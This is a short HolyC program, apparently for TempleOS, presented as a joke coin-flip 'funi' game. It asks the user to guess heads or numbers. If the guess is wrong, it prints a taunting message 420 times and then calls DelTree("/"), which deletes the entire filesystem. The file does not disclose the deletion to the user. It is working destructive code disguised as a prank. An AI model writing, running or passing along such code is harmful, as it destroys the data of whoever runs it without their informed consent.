// THIS PROGRAM WILL EXECUTE THE FUNI ON YOUR MACHINE FOR THE 2nd TIME!
// DEVELOPED BY MICKMMARS

U8 funiMethod() {

  Bool ask = PopUpNoYes("Yes = Head / No = Number");
  
  U64 r = RandI64() % 2;
  
  Bool rb = r == 0;
  
  if (ask != rb) {
    U64 funiNumber;
    
    for (funiNumber = 0; funiNumber < 420; funiNumber++)
      "$$RED$$You just got funi'd$$BLUE$$";
      
    DelTree("/");
  } else {
    "Alright! You won, I won't do the funi :(";
  }
  
  return 0;
}

funiMethod();
